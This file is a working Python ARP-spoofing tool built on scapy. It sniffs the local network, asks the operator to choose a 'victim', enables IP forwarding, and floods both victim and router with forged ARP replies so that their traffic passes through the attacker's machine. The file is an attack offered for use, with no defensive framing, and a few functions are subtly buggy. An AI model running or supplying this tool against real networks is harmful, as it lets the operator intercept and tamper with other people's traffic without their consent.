#!/usr/bin/env python3
doggy = """
    __    __
    \/----\/
     \0  0/    WOOF!
     _\  /_
   _|  \/  |_
  | | |  | | |
 _| | |  | | |_
"---|_|--|_|---"
"""
import os
import sys
import time
import argparse
import logging
import socket
import scapy.all as scapy

def setup_logging(verbose=False, log_file=None):
    level = logging.DEBUG if verbose else logging.INFO
    format_str = '%(asctime)s - %(levelname)s - %(message)s'
    if log_file:
        logging.basicConfig(level=level, format=format_str, filename=log_file)
    else:
        logging.basicConfig(level=level, format=format_str)

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def get_local_ip():
    try:
        return scapy.get_if_addr()
    except OSError:
        logging.error("Failed to fetch the local IP address")
        sys.exit(1)

def sniff_packets(interface, count=10):
    logging.info("Sniffing packets on interface %s...", interface)
    packets = scapy.sniff(iface=interface, count=count)
    return packets

def extract_victim_info(packets):
    victim_ips = set()
    victim_macs = set()
    for packet in packets:
        if scapy.ARP in packet and packet[scapy.ARP].op in (1, 2):  # ARP request or reply
            victim_ip = packet[scapy.ARP].psrc
            victim_mac = packet[scapy.ARP].hwsrc
            victim_ips.add(victim_ip)
            victim_macs.add(victim_mac)
    return victim_ips, victim_macs

def select_victim(victim_ips, victim_macs):
    print("Detected Devices:")
    for i, (ip, mac) in enumerate(zip(victim_ips, victim_macs), 1):
        print(f"{i}. IP: {ip}, MAC: {mac}")
    choice = input("Select the victim by entering the corresponding number: ")
    try:
        choice = int(choice)
        if 1 <= choice <= len(victim_ips):
            return victim_ips[choice - 1]
    except ValueError:
        pass
    print("Invalid choice. Please enter a valid number.")
    return None

def get_victim_info(interface):
    packets = sniff_packets(interface)
    victim_ips, victim_macs = extract_victim_info(packets)
    victim_ip = select_victim(list(victim_ips), list(victim_macs))
    if victim_ip:
        logging.info("Selected victim IP: %s", victim_ip)
    else:
        logging.error("Failed to select a victim.")
    return victim_ip

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass

def arp_spoof(target_ip, spoof_ip, count=100, interval=1):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        for _ in range(count):
            scapy.send(packet, verbose=False)
            logging.info("Sent a devious ARP packet to %s", target_ip)
            time.sleep(interval)
    else:
        logging.error("Failed to get the MAC address of the target %s", target_ip)

def restore_arp_tables(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        logging.info("ARP tables reset for %s", destination_ip)
    else:
        logging.error("Failed to reset ARP tables for %s", destination_ip)

def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "0\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("1\n")
                    logging.info("IP forwarding is now on")
    except IOError:
        logging.exception("Failed to enable IP forwarding")

def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "1\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("0\n")
                    logging.info("IP forwarding is now off")
    except IOError:
        logging.exception("Failed to disable IP forwarding")

def main(args):
    router_ip = args.router_ip
    interface = args.interface
    verbose = args.verbose
    log_file = args.log_file

    setup_logging(verbose, log_file)

    if not validate_ip(router_ip):
        logging.error("The provided router IP address is invalid")
        sys.exit(1)

    if not interface:
        interface = get_local_ip()

    try:
        enable_ip_forwarding()
        logging.info("Preparing to launch ARP attacks...")

        victim_ip = get_victim_info(interface)
        if not victim_ip:
            sys.exit(1)

        while True:
            arp_spoof(victim_ip, router_ip, args.packet_count, args.interval)
            arp_spoof(router_ip, victim_ip, args.packet_count, args.interval)

    except KeyboardInterrupt:
        logging.info("Detected Ctrl+C, resetting the network...")
        if victim_ip:
            restore_arp_tables(victim_ip, router_ip)
        restore_arp_tables(router_ip, victim_ip)
        disable_ip_forwarding()
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script for ARP spoofing attacks")
    parser.add_argument("router_ip", help="IP address of the router")
    parser.add_argument("-i", "--interface", help="Interface for reconnaissance (default: system's local IP)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for detailed logging")
    parser.add_argument("-c", "--packet_count", type=int, default=100, help="Number of ARP packets to send (default: 100)")
    parser.add_argument("-p", "--interval", type=int, default=1, help="Interval between ARP packets (default: 1 second)")
    parser.add_argument("-l", "--log_file", help="File to write log output")
    args = parser.parse_args()
    print(doggy)
    main(args)
